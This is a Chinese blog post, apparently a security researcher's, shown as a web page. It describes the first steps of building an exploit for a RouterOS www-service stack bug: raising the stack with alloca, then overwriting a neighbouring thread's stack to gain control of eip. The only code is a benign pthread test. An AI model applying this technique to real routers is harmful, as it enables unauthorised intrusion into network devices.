@@ -1,0 +1,1069 @@
+<!DOCTYPE html>
+<html style="display: none;" lang="zh">
+    <head>
+    <meta charset="utf-8">
+    <meta name="baidu-site-verification" content="RC70b8mZ9A" />
+    <meta name="msvalidate.01" content="325714A6172A8D425D843D8163893A54" />
+    <meta name="google-site-verification" content="QgUuEnRKG0PKdnDrOxnq55x7VxQbCiprrMJpfakMlow" />
+    <!--
+        © Material Theme
+        https://github.com/viosey/hexo-theme-material
+        Version: 1.5.0 -->
+    <script>
+        window.materialVersion = "1.5.0"
+        // Delete localstorage with these tags
+        window.oldVersion = [
+            'codestartv1',
+            '1.3.4',
+            '1.4.0',
+            '1.4.0b1'
+        ]
+    </script>
+
+
+    <!-- dns prefetch -->
+    <meta http-equiv="x-dns-prefetch-control" content="on">
+
+
+
+    <link rel="dns-prefetch" href="https://busuanzi.ibruce.info"/>
+
+
+
+        <link rel="dns-prefetch" href="https://cdn-city.livere.com"/>
+
+
+
+
+
+
+
+
+
+
+    <!-- Title -->
+    
+    <title>
+        
+            一步一步 Pwn RouterOS之exploit构造 | 
+        
+        穷则变，变则通，通则久
+    </title>
+
+    <!-- Meta & Info -->
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <meta name="format-detection" content="telephone=no"/>
+    <meta name="theme-color" content="#0097A7">
+    <meta name="author" content="hac425">
+    <meta name="description" itemprop="description" content="">
+    <meta name="keywords" content=",rop by dlsym,rop by strncpy">
+
+    <!-- Import lsloader -->
+    <script>(function(){window.lsloader={jsRunSequence:[],jsnamemap:{},cssnamemap:{}};lsloader.removeLS=function(key){try{localStorage.removeItem(key)}catch(e){}};lsloader.setLS=function(key,val){try{localStorage.setItem(key,val)}catch(e){}};lsloader.getLS=function(key){var val="";try{val=localStorage.getItem(key)}catch(e){val=""}return val};versionString="/*"+(window.materialVersion||"unknownVersion")+"*/";lsloader.clean=function(){try{var keys=[];for(var i=0;i<localStorage.length;i++){keys.push(localStorage.key(i))}keys.forEach(function(key){var data=lsloader.getLS(key);if(window.oldVersion){var remove=window.oldVersion.reduce(function(p,c){return p||data.indexOf("/*"+c+"*/")!==-1},false);if(remove){lsloader.removeLS(key)}}})}catch(e){}};lsloader.clean();lsloader.load=function(jsname,jspath,cssonload,isJs){if(typeof cssonload==="boolean"){isJs=cssonload;cssonload=undefined}isJs=isJs||false;cssonload=cssonload||function(){};var code;code=this.getLS(jsname);if(code&&code.indexOf(versionString)===-1){this.removeLS(jsname);this.requestResource(jsname,jspath,cssonload,isJs);return}if(code){var versionNumber=code.split(versionString)[0];if(versionNumber!=jspath){console.log("reload:"+jspath);this.removeLS(jsname);this.requestResource(jsname,jspath,cssonload,isJs);return}code=code.split(versionString)[1];if(isJs){this.jsRunSequence.push({name:jsname,code:code});this.runjs(jspath,jsname,code)}else{document.getElementById(jsname).appendChild(document.createTextNode(code));cssonload()}}else{this.requestResource(jsname,jspath,cssonload,isJs)}};lsloader.requestResource=function(name,path,cssonload,isJs){var that=this;if(isJs){this.iojs(path,name,function(path,name,code){that.setLS(name,path+versionString+code);that.runjs(path,name,code)})}else{this.iocss(path,name,function(code){document.getElementById(name).appendChild(document.createTextNode(code));that.setLS(name,path+versionString+code)},cssonload)}};lsloader.iojs=function(path,jsname,callback){var that=this;that.jsRunSequence.push({name:jsname,code:""});try{var xhr=new XMLHttpRequest;xhr.open("get",path,true);xhr.onreadystatechange=function(){if(xhr.readyState==4){if(xhr.status>=200&&xhr.status<300||xhr.status==304){if(xhr.response!=""){callback(path,jsname,xhr.response);return}}that.jsfallback(path,jsname)}};xhr.send(null)}catch(e){that.jsfallback(path,jsname)}};lsloader.iocss=function(path,jsname,callback,cssonload){var that=this;try{var xhr=new XMLHttpRequest;xhr.open("get",path,true);xhr.onreadystatechange=function(){if(xhr.readyState==4){if(xhr.status>=200&&xhr.status<300||xhr.status==304){if(xhr.response!=""){callback(xhr.response);cssonload();return}}that.cssfallback(path,jsname,cssonload)}};xhr.send(null)}catch(e){that.cssfallback(path,jsname,cssonload)}};lsloader.iofonts=function(path,jsname,callback,cssonload){var that=this;try{var xhr=new XMLHttpRequest;xhr.open("get",path,true);xhr.onreadystatechange=function(){if(xhr.readyState==4){if(xhr.status>=200&&xhr.status<300||xhr.status==304){if(xhr.response!=""){callback(xhr.response);cssonload();return}}that.cssfallback(path,jsname,cssonload)}};xhr.send(null)}catch(e){that.cssfallback(path,jsname,cssonload)}};lsloader.runjs=function(path,name,code){if(!!name&&!!code){for(var k in this.jsRunSequence){if(this.jsRunSequence[k].name==name){this.jsRunSequence[k].code=code}}}if(!!this.jsRunSequence[0]&&!!this.jsRunSequence[0].code&&this.jsRunSequence[0].status!="failed"){var script=document.createElement("script");script.appendChild(document.createTextNode(this.jsRunSequence[0].code));script.type="text/javascript";document.getElementsByTagName("head")[0].appendChild(script);this.jsRunSequence.shift();if(this.jsRunSequence.length>0){this.runjs()}}else if(!!this.jsRunSequence[0]&&this.jsRunSequence[0].status=="failed"){var that=this;var script=document.createElement("script");script.src=this.jsRunSequence[0].path;script.type="text/javascript";this.jsRunSequence[0].status="loading";script.onload=function(){that.jsRunSequence.shift();if(that.jsRunSequence.length>0){that.runjs()}};document.body.appendChild(script)}};lsloader.tagLoad=function(path,name){this.jsRunSequence.push({name:name,code:"",path:path,status:"failed"});this.runjs()};lsloader.jsfallback=function(path,name){if(!!this.jsnamemap[name]){return}else{this.jsnamemap[name]=name}for(var k in this.jsRunSequence){if(this.jsRunSequence[k].name==name){this.jsRunSequence[k].code="";this.jsRunSequence[k].status="failed";this.jsRunSequence[k].path=path}}this.runjs()};lsloader.cssfallback=function(path,name,cssonload){if(!!this.cssnamemap[name]){return}else{this.cssnamemap[name]=1}var link=document.createElement("link");link.type="text/css";link.href=path;link.rel="stylesheet";link.onload=link.onerror=cssonload;var root=document.getElementsByTagName("script")[0];root.parentNode.insertBefore(link,root)};lsloader.runInlineScript=function(scriptId,codeId){var code=document.getElementById(codeId).innerText;this.jsRunSequence.push({name:scriptId,code:code});this.runjs()};lsloader.loadCombo=function(jslist){var updateList="";var requestingModules={};for(var k in jslist){var LS=this.getLS(jslist[k].name);if(!!LS){var version=LS.split(versionString)[0];var code=LS.split(versionString)[1]}else{var version=""}if(version==jslist[k].path){this.jsRunSequence.push({name:jslist[k].name,code:code,path:jslist[k].path})}else{this.jsRunSequence.push({name:jslist[k].name,code:null,path:jslist[k].path,status:"comboloading"});requestingModules[jslist[k].name]=true;updateList+=(updateList==""?"":";")+jslist[k].path}}var that=this;if(!!updateList){var xhr=new XMLHttpRequest;xhr.open("get",combo+updateList,true);xhr.onreadystatechange=function(){if(xhr.readyState==4){if(xhr.status>=200&&xhr.status<300||xhr.status==304){if(xhr.response!=""){that.runCombo(xhr.response,requestingModules);return}}else{for(var i in that.jsRunSequence){if(requestingModules[that.jsRunSequence[i].name]){that.jsRunSequence[i].status="failed"}}that.runjs()}}};xhr.send(null)}this.runjs()};lsloader.runCombo=function(comboCode,requestingModules){comboCode=comboCode.split("/*combojs*/");comboCode.shift();for(var k in this.jsRunSequence){if(!!requestingModules[this.jsRunSequence[k].name]&&!!comboCode[0]){this.jsRunSequence[k].status="comboJS";this.jsRunSequence[k].code=comboCode[0];this.setLS(this.jsRunSequence[k].name,this.jsRunSequence[k].path+versionString+comboCode[0]);comboCode.shift()}}this.runjs()}})();</script>
+
+    <!-- Import queue -->
+    <script>function Queue(){this.dataStore=[];this.offer=b;this.poll=d;this.execNext=a;this.debug=false;this.startDebug=c;function b(e){if(this.debug){console.log("Offered a Queued Function.")}if(typeof e==="function"){this.dataStore.push(e)}else{console.log("You must offer a function.")}}function d(){if(this.debug){console.log("Polled a Queued Function.")}return this.dataStore.shift()}function a(){var e=this.poll();if(e!==undefined){if(this.debug){console.log("Run a Queued Function.")}e()}}function c(){this.debug=true}}var queue=new Queue();</script>
+
+    <!-- Favicons -->
+    <link rel="icon shortcut" type="image/ico" href="/img/girl.png">
+    <link rel="icon" sizes="192x192" href="/img/girl.png">
+    <link rel="apple-touch-icon" href="/img/girl.png">
+
+    <!--iOS -->
+    <meta name="apple-mobile-web-app-title" content="Title">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="MobileOptimized" content="480">
+
+    <!-- Add to homescreen for Chrome on Android -->
+    <meta name="mobile-web-app-capable" content="yes">
+
+    <!-- Add to homescreen for Safari on iOS -->
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="apple-mobile-web-app-title" content="穷则变，变则通，通则久">
+
+    <!-- Site Verification -->
+    
+    
+
+    <!-- RSS -->
+    
+
+    <!--[if lte IE 9]>
+        <link rel="stylesheet" href="/css/ie-blocker.css">
+
+        
+            <script src="/js/ie-blocker.zhCN.js"></script>
+        
+    <![endif]-->
+
+    <!-- Import CSS -->
+    
+        <style id="material_css"></style><script>if(typeof window.lsLoadCSSMaxNums === "undefined")window.lsLoadCSSMaxNums = 0;window.lsLoadCSSMaxNums++;lsloader.load("material_css","/css/material.min.css?Z7a72R1E4SxzBKR/WGctOA==",function(){if(typeof window.lsLoadCSSNums === "undefined")window.lsLoadCSSNums = 0;window.lsLoadCSSNums++;if(window.lsLoadCSSNums == window.lsLoadCSSMaxNums)document.documentElement.style.display="";}, false)</script>
+        <style id="style_css"></style><script>if(typeof window.lsLoadCSSMaxNums === "undefined")window.lsLoadCSSMaxNums = 0;window.lsLoadCSSMaxNums++;lsloader.load("style_css","/css/style.min.css?MKetZV3cUTfDxvMffaOezg==",function(){if(typeof window.lsLoadCSSNums === "undefined")window.lsLoadCSSNums = 0;window.lsLoadCSSNums++;if(window.lsLoadCSSNums == window.lsLoadCSSMaxNums)document.documentElement.style.display="";}, false)</script>
+
+        
+
+    
+
+    
+
+    <!-- Config CSS -->
+
+<!-- Other Styles -->
+<style>
+  body, html {
+    font-family: Roboto, "Helvetica Neue", Helvetica, "PingFang SC", "Hiragino Sans GB", "Microsoft YaHei", "微软雅黑", Arial, sans-serif;
+    overflow-x: hidden !important;
+  }
+  
+  code {
+    font-family: Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace;
+  }
+
+  a {
+    color: #00838F;
+  }
+
+  .mdl-card__media,
+  #search-label,
+  #search-form-label:after,
+  #scheme-Paradox .hot_tags-count,
+  #scheme-Paradox .sidebar_archives-count,
+  #scheme-Paradox .sidebar-colored .sidebar-header,
+  #scheme-Paradox .sidebar-colored .sidebar-badge{
+    background-color: #0097A7 !important;
+  }
+
+  /* Sidebar User Drop Down Menu Text Color */
+  #scheme-Paradox .sidebar-colored .sidebar-nav>.dropdown>.dropdown-menu>li>a:hover,
+  #scheme-Paradox .sidebar-colored .sidebar-nav>.dropdown>.dropdown-menu>li>a:focus {
+    color: #0097A7 !important;
+  }
+
+  #post_entry-right-info,
+  .sidebar-colored .sidebar-nav li:hover > a,
+  .sidebar-colored .sidebar-nav li:hover > a i,
+  .sidebar-colored .sidebar-nav li > a:hover,
+  .sidebar-colored .sidebar-nav li > a:hover i,
+  .sidebar-colored .sidebar-nav li > a:focus i,
+  .sidebar-colored .sidebar-nav > .open > a,
+  .sidebar-colored .sidebar-nav > .open > a:hover,
+  .sidebar-colored .sidebar-nav > .open > a:focus,
+  #ds-reset #ds-ctx .ds-ctx-entry .ds-ctx-head a {
+    color: #0097A7 !important;
+  }
+
+  .toTop {
+    background: #757575 !important;
+  }
+
+  .material-layout .material-post>.material-nav,
+  .material-layout .material-index>.material-nav,
+  .material-nav a {
+    color: #757575;
+  }
+
+  #scheme-Paradox .MD-burger-layer {
+    background-color: #757575;
+  }
+
+  #scheme-Paradox #post-toc-trigger-btn {
+    color: #757575;
+  }
+
+  .post-toc a:hover {
+    color: #00838F;
+    text-decoration: underline;
+  }
+
+</style>
+
+
+<!-- Theme Background Related-->
+
+    <style>
+      body{
+        background-color: #F5F5F5;
+      }
+
+      /* blog_info bottom background */
+      #scheme-Paradox .material-layout .something-else .mdl-card__supporting-text{
+        background-color: #fff;
+      }
+    </style>
+
+
+
+
+<!-- Fade Effect -->
+
+    <style>
+      .fade {
+        transition: all 800ms linear;
+        -webkit-transform: translate3d(0,0,0);
+        -moz-transform: translate3d(0,0,0);
+        -ms-transform: translate3d(0,0,0);
+        -o-transform: translate3d(0,0,0);
+        transform: translate3d(0,0,0);
+        opacity: 1;
+      }
+
+      .fade.out{
+        opacity: 0;
+      }
+    </style>
+
+
+<!-- Import Font -->
+<!-- Import Roboto -->
+
+    <link href="https://fonts.googleapis.com/css?family=Roboto:300,400,500" rel="stylesheet">
+
+
+<!-- Import Material Icon -->
+
+    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+
+
+
+
+    <!-- Import jQuery -->
+    
+        <script>lsloader.load("jq_js","/js/jquery.min.js?ezyEvm8ST5CGfpA+kFFi1g==", true)</script>
+    
+
+    <!-- The Open Graph protocol -->
+    <meta property="og:url" content="http://blog.hac425.top">
+    <meta property="og:type" content="blog">
+    <meta property="og:title" content="一步一步 Pwn RouterOS之exploit构造 | 穷则变，变则通，通则久">
+    <meta property="og:image" content="http://blog.hac425.top/img/girl.png" />
+    <meta property="og:description" content="">
+    <meta property="og:article:tag" content="rop by dlsym"> <meta property="og:article:tag" content="rop by strncpy"> 
+
+    
+        <meta property="article:published_time" content="Sat Jan 06 2018 00:48:00 GMT+0800" />
+        <meta property="article:modified_time" content="Fri Jan 12 2018 23:22:36 GMT+0800" />
+    
+
+    <!-- The Twitter Card protocol -->
+    <meta name="twitter:title" content="一步一步 Pwn RouterOS之exploit构造 | 穷则变，变则通，通则久">
+    <meta name="twitter:description" content="">
+    <meta name="twitter:image" content="http://blog.hac425.top/img/girl.png">
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:url" content="http://blog.hac425.top" />
+
+    <!-- Add canonical link for SEO -->
+    
+        <link rel="canonical" href="http://blog.hac425.top/2018/01/06/pwn_router_os_step_exp.html" />
+    
+
+    <!-- Structured-data for SEO -->
+    
+        
+
+
+<script type="application/ld+json">
+{
+    "@context": "https://schema.org",
+    "@type": "BlogPosting",
+    "mainEntityOfPage": "http://blog.hac425.top/2018/01/06/pwn_router_os_step_exp.html",
+    "headline": "一步一步 Pwn RouterOS之exploit构造",
+    "datePublished": "Sat Jan 06 2018 00:48:00 GMT+0800",
+    "dateModified": "Fri Jan 12 2018 23:22:36 GMT+0800",
+    "author": {
+        "@type": "Person",
+        "name": "hac425",
+        "image": {
+            "@type": "ImageObject",
+            "url": "/img/girl.png"
+        },
+        "description": "纵横捭阖，冷心为上"
+    },
+    "publisher": {
+        "@type": "Organization",
+        "name": "穷则变，变则通，通则久",
+        "logo": {
+            "@type":"ImageObject",
+            "url": "/img/girl.png"
+        }
+    },
+    "keywords": ",rop by dlsym,rop by strncpy",
+    "description": "",
+}
+</script>
+
+
+    
+
+    <!-- Analytics -->
+    
+    
+        <script>
+    var _hmt = _hmt || [];
+    (function() {var hm = document.createElement('script');
+    hm.src = 'https://hm.baidu.com/hm.js?99747687c69d73d9102f032f78f03e96';
+    var s = document.getElementsByTagName('script')[0];
+    s.parentNode.insertBefore(hm, s);
+    })();
+</script>
+    
+    
+
+    <!-- Custom Head -->
+    
+
+</head>
+
+
+    
+        <body id="scheme-Paradox" class="lazy">
+            <div class="material-layout  mdl-js-layout has-drawer is-upgraded">
+                
+
+                <!-- Main Container -->
+                <main class="material-layout__content" id="main">
+
+                    <!-- Top Anchor -->
+                    <div id="top"></div>
+
+                    
+                        <!-- Hamburger Button -->
+                        <button class="MD-burger-icon sidebar-toggle">
+                            <span class="MD-burger-layer"></span>
+                        </button>
+                    
+
+                    <!-- Post TOC -->
+
+    
+    <!-- Back Button -->
+    <!--
+    <div class="material-back" id="backhome-div" tabindex="0">
+        <a class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon"
+           href="#" onclick="window.history.back();return false;"
+           target="_self"
+           role="button"
+           data-upgraded=",MaterialButton,MaterialRipple">
+            <i class="material-icons" role="presentation">arrow_back</i>
+            <span class="mdl-button__ripple-container">
+                <span class="mdl-ripple"></span>
+            </span>
+        </a>
+    </div>
+    -->
+
+
+    <!-- Left aligned menu below button -->
+    
+    
+    <button id="post-toc-trigger-btn"
+        class="mdl-button mdl-js-button mdl-button--icon">
+        <i class="material-icons">format_list_numbered</i>
+    </button>
+
+    <ul class="post-toc-wrap mdl-menu mdl-menu--bottom-left mdl-js-menu mdl-js-ripple-effect" for="post-toc-trigger-btn" style="max-height:80vh; overflow-y:scroll;">
+        <ol class="post-toc"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#前言"><span class="post-toc-number">1.</span> <span class="post-toc-text">前言</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#正文"><span class="post-toc-number">2.</span> <span class="post-toc-text">正文</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#最后"><span class="post-toc-number">3.</span> <span class="post-toc-text">最后</span></a></li></ol>
+    </ul>
+    
+
+
+
+
+<!-- Layouts -->
+
+    <!-- Post Module -->
+    <div class="material-post_container">
+
+        <div class="material-post mdl-grid">
+            <div class="mdl-card mdl-shadow--4dp mdl-cell mdl-cell--12-col">
+
+                <!-- Post Header(Thumbnail & Title) -->
+                
+    <!-- Paradox Post Header -->
+    
+        
+            <!-- Random Thumbnail -->
+            <div class="post_thumbnail-random mdl-card__media mdl-color-text--grey-50">
+            <script type="text/ls-javascript" id="post-thumbnail-script">
+    var randomNum = Math.floor(Math.random() * 19 + 1);
+
+    $('.post_thumbnail-random').attr('data-original', '/img/random/material-' + randomNum + '.png');
+    $('.post_thumbnail-random').addClass('lazy');
+</script>
+
+        
+    
+            <p class="article-headline-p">
+                一步一步 Pwn RouterOS之exploit构造
+            </p>
+        </div>
+
+
+
+
+
+                
+                    <!-- Paradox Post Info -->
+                    <div class="mdl-color-text--grey-700 mdl-card__supporting-text meta">
+
+    <!-- Author Avatar -->
+    <div id="author-avatar">
+        <img src="/img/girl.png" width="44px" height="44px" alt="Author Avatar"/>
+    </div>
+    <!-- Author Name & Date -->
+    <div>
+        <strong>hac425</strong>
+        <span>1月 06, 2018</span>
+    </div>
+
+    <div class="section-spacer"></div>
+
+    <!-- Favorite -->
+    <!--
+        <button id="article-functions-like-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon btn-like">
+            <i class="material-icons" role="presentation">favorite</i>
+            <span class="visuallyhidden">favorites</span>
+        </button>
+    -->
+
+    <!-- Qrcode -->
+    
+        <button id="article-functions-qrcode-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon">
+    <i class="material-icons" role="presentation">devices other</i>
+    <span class="visuallyhidden">devices other</span>
+</button>
+<ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="article-functions-qrcode-button">
+    <li class="mdl-menu__item">在其它设备中阅读本文章</li>
+    
+        <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAACZElEQVR42u3aS27DMAwFwNz/0u22QBHnkZRktxivgsIfjRai+sTX17++Xnh4eHh4eHh4eA/jveIrevWb+3/+JblnMjY8PDy8M7xk0IWl+deHE/D173xseHh4eCd57xbc62U9X+ivl/uEGk0cHh4e3iN5OWPVBOHh4eH9dV4eVeTI5Fk8PDy8p/Gqn8m3znlRuTlrwcPDw4t5+SHT+d9Hz/fw8PDwAl71yqcgLwy9NoW3I8TDw8PbzMsX4upW+5paDSwK8QceHh7eQV4SJfQAyZ3VBtZR1oKHh4c34PWGUi0t1Zi4dw8eHh7eGd68eTQpG3mosaV1AA8PD28DLxl0HrD2WgTywPfDxOHh4eEd5OWb2usP56HGJJ4odEbg4eHhHedVt929RtU8HFlcGPDw8PC27TnzY7Bqwai2JoxaB/Dw8PCW8vL202pYUFjWi4FIM8bFw8PDG/N6h/e9WCF/tjnReHh4eEd4+fF/PqBJAJE3MYzO9/Dw8PBavGqQuiqwmJcEPDw8vLt41c/MqTkjb1/Aw8PDu4t3PfTC0hw0DfSmNXo/Hh4e3hHeqs9P7l+Gx8PDwzvIyw/784aqamScbM3x8PDwnszLo4dqqagyCsUGDw8PbzNvxzFYHlX03llousLDw8PbwHvFVx4irAqIl/WU4eHh4W3gVYtB7/i/GtcuKwx4eHh423iTBbrXXFVlL8ha8PDw8G7izacgGXr1KTw8PLzn85JDrDyuzSOPD/8A4OHh4R3k5UdWkwOzVeUEDw8P715eLwKoFomkMPRCYTw8PLyTvP934eHh4eHh4eHhPeD6BtFtFhGxhsIaAAAAAElFTkSuQmCC">
+    
+</ul>
+
+    
+
+    <!-- Tags (bookmark) -->
+    
+    <button id="article-functions-viewtags-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon">
+        <i class="material-icons" role="presentation">bookmark</i>
+        <span class="visuallyhidden">bookmark</span>
+    </button>
+    <ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="article-functions-viewtags-button">
+        <li class="mdl-menu__item">
+        <a class="post_tag-link" href="/tags/rop-by-dlsym/">rop by dlsym</a></li><li class="mdl-menu__item"><a class="post_tag-link" href="/tags/rop-by-strncpy/">rop by strncpy</a>
+    </ul>
+    
+
+    <!-- Share -->
+    <button id="article-fuctions-share-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon">
+    <i class="material-icons" role="presentation">share</i>
+    <span class="visuallyhidden">share</span>
+</button>
+<ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="article-fuctions-share-button">
+    
+
+    
+        
+            <!-- Busuanzi Views -->
+            <a class="post_share-link" href="#">
+                <li class="mdl-menu__item">
+                    <span id="busuanzi_container_page_pv">
+                        <span id="busuanzi_value_page_pv"></span>&nbsp;浏览量
+                    </span>
+                </li>
+            </a>
+        
+    
+
+    <!-- Share Weibo -->
+    
+        <a class="post_share-link" href="http://service.weibo.com/share/share.php?appkey=&title=一步一步 Pwn RouterOS之exploit构造&url=http://blog.hac425.top/2018/01/06/pwn_router_os_step_exp.html&pic=http://blog.hac425.top/img/girl.png&searchPic=false&style=simple" target="_blank">
+            <li class="mdl-menu__item">
+                分享到微博
+            </li>
+        </a>
+    
+
+    <!-- Share Twitter -->
+    
+        <a class="post_share-link" href="https://twitter.com/intent/tweet?text=一步一步 Pwn RouterOS之exploit构造&url=http://blog.hac425.top/2018/01/06/pwn_router_os_step_exp.html&via=hac425" target="_blank">
+            <li class="mdl-menu__item">
+                分享到 Twitter
+            </li>
+        </a>
+    
+
+    <!-- Share Facebook -->
+    
+        <a class="post_share-link" href="https://www.facebook.com/sharer/sharer.php?u=http://blog.hac425.top/2018/01/06/pwn_router_os_step_exp.html" target="_blank">
+            <li class="mdl-menu__item">
+                分享到 Facebook
+            </li>
+        </a>
+    
+
+    <!-- Share Google+ -->
+    
+        <a class="post_share-link" href="https://plus.google.com/share?url=http://blog.hac425.top/2018/01/06/pwn_router_os_step_exp.html" target="_blank">
+            <li class="mdl-menu__item">
+                分享到 Google+
+            </li>
+        </a>
+    
+
+    <!-- Share LinkedIn -->
+    
+
+    <!-- Share QQ -->
+    
+
+    <!-- Share Telegram -->
+    
+</ul>
+
+</div>
+
+                
+
+                <!-- Post Content -->
+                <div id="post-content" class="mdl-color-text--grey-700 mdl-card__supporting-text fade out">
+    
+        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><hr>
+<p>本文由 <strong>本人</strong> 首发于 先知安全技术社区：  <a href="https://xianzhi.aliyun.com/forum/user/5274/" target="_blank" rel="external">https://xianzhi.aliyun.com/forum/user/5274/</a></p>
+<hr>
+<p>前面已经分析完漏洞，并且搭建好了调试环境，本文将介绍如何利用漏洞写出 <code>exploit</code></p>
+<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p><strong>控制 eip</strong></p>
+<p>看看我们现在所拥有的能力</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/15151713048316b66g6te.png?imageslim" alt="paste image"></p>
+<p>我们可以利用 <code>alloca</code> 的 <code>sub esp *</code> 把栈抬高，然后往 那里写入数据。</p>
+<p>现在的问题是我们栈顶的上方有什么重要的数据是可以修改的。</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1515171497999x0f7vynu.png?imageslim" alt="paste image"></p>
+<p>一般情况下，我们是没办法利用的，因为 栈上面就是 堆， 而他们之间的地址是不固定的。 </p>
+<p>为了利用该漏洞，需要了解一点多线程实现的机制，不同线程拥有不同的线程栈， 而线程栈的位置就在 进程的 栈空间内。线程栈 按照线程的创建顺序，依次在 栈上排列。线程栈的大小可以指定。默认大概是 8MB.</p>
+<p>写了一个小程序，测试了一下。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div></pre></td><td class="code"><pre><div class="line">#include &lt;pthread.h&gt;</div><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;sys/time.h&gt;</div><div class="line">#include &lt;string.h&gt;</div><div class="line">#define MAX 10</div><div class="line">pthread_t thread[2];</div><div class="line">pthread_mutex_t mut;</div><div class="line">int number=0, i;</div><div class="line">void *thread1()</div><div class="line">&#123;</div><div class="line">		int a;</div><div class="line">        printf(&quot;thread1 %p\n&quot;, &amp;a);</div><div class="line">&#125;</div><div class="line">void *thread2()</div><div class="line">&#123;</div><div class="line">       	int a;</div><div class="line">        printf(&quot;thread2 %p\n&quot;, &amp;a);</div><div class="line">&#125;</div><div class="line">void thread_create(void)</div><div class="line">&#123;</div><div class="line">        int temp;</div><div class="line">        memset(&amp;thread, 0, sizeof(thread));          //comment1</div><div class="line">        /*创建线程*/</div><div class="line">        if((temp = pthread_create(&amp;thread[0], NULL, thread1, NULL)) != 0)       //comment2</div><div class="line">                printf(&quot;线程1创建失败!\n&quot;);</div><div class="line">        else</div><div class="line">                printf(&quot;线程1被创建\n&quot;);</div><div class="line">        if((temp = pthread_create(&amp;thread[1], NULL, thread2, NULL)) != 0)  //comment3</div><div class="line">                printf(&quot;线程2创建失败&quot;);</div><div class="line">        else</div><div class="line">                printf(&quot;线程2被创建\n&quot;);</div><div class="line">&#125;</div><div class="line">void thread_wait(void)</div><div class="line">&#123;</div><div class="line">        /*等待线程结束*/</div><div class="line">        if(thread[0] !=0) &#123;                   //comment4</div><div class="line">                pthread_join(thread[0],NULL);</div><div class="line">                printf(&quot;线程1已经结束\n&quot;);</div><div class="line">        &#125;</div><div class="line">        if(thread[1] !=0) &#123;                //comment5</div><div class="line">                pthread_join(thread[1],NULL);</div><div class="line">                printf(&quot;线程2已经结束\n&quot;);</div><div class="line">        &#125;</div><div class="line">&#125;</div><div class="line">int main()</div><div class="line">&#123;</div><div class="line">        /*用默认属性初始化互斥锁*/</div><div class="line">        pthread_mutex_init(&amp;mut,NULL);</div><div class="line">        printf(&quot;我是主函数哦，我正在创建线程，呵呵\n&quot;);</div><div class="line">        thread_create();</div><div class="line">        printf(&quot;我是主函数哦，我正在等待线程完成任务阿，呵呵\n&quot;);</div><div class="line">        thread_wait();</div><div class="line">        return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>就是打印了两个线程中的栈内存地址信息，然后相减，就可以大概知道线程栈的大小。<br><img src="http://oy9h5q2k4.bkt.clouddn.com/1515171997712kemr24ne.png?imageslim" alt="paste image"></p>
+<p>多次运行发现，线程栈之间应该是相邻的，因为打印出来的值的差是固定的。</p>
+<p>线程栈也是可以通过 <code>pthread_attr_setstacksize</code> 设置, 在 <code>RouterOs</code> 的 <code>www</code>的 <code>main</code> 函数里面就进行了设置。</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1515172296024czdw05qh.png?imageslim" alt="paste image"></p>
+<p>所以在 <code>www</code> 中的线程栈的大小 为 <code>0x20000</code>。</p>
+<p>当我们同时开启两个 <code>socket</code> 连接时，进程的栈布局</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1515172554545mn6hijda.png?imageslim" alt="paste image"></p>
+<p>此时在 <code>线程 1</code> 中触发漏洞，我们就能修改 <code>线程 2</code> 的数据。</p>
